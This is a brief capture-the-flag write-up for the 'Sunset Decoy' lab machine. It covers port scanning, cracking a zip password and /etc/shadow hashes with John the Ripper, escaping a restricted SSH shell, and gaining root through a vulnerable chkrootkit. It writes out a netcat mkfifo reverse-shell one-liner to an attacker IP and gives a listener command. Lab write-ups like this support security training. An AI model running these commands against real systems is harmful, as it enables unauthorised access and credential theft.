@@ -1,0 +1,50 @@
+192.168.244.85 [Sunset Decoy Writup]
+scan system using nmap and find 
+open port 22,80
+Oepn website and find one file save.zip 
+
+downlaod and extract it need password
+zip2john save.zip >hash.txt
+john hash.txt
+Get password for save.zip 
+
+unzip and found 2 interesteing files passwd and shadow 
+We can crack the hash
+unshadow passwd.txt shadow.txt >unshadow.txt
+john unshadow.txt --wordlist /usr/share/wordlists/rockyou.txt
+
+got username and password 
+login using ssh
+
+296640a3b825115a47b68fc44501c828@192.168.244.85
+what the hell i cant run any command due to the restricted shell
+296640a3b825115a47b68fc44501c828@192.168.244.85 -t "bash -noprofile"
+
+https://0xffsec.com/handbook/shells/restricted-shells/
+
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+Enumerating the machine but not get any intersting suod, SUID nothing I got
+run the honeypot file
+I got some options , I tried run number 5.Launch an AV Scan. It will start some process, I want to check what process its running in background , I will use pspy
+Try to check running processes 
+https://github.com/DominicBreuker/pspy
+I found chkrootkit-0.49 is running in background which is vulnerable for privilege escalation
+cd /tmp/
+cat update 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.236 1234 >/tmp/f
+hmod +x update
+cd ~
+
+/honeypot.decoy 
+choose number 5
+start reverse shell listener on Attacker machine 
+nc -nvlp 1234
+Wait and watch
+I got root access
+
+
+
+
+
+https://www.exploit-db.com/exploits/33899
+
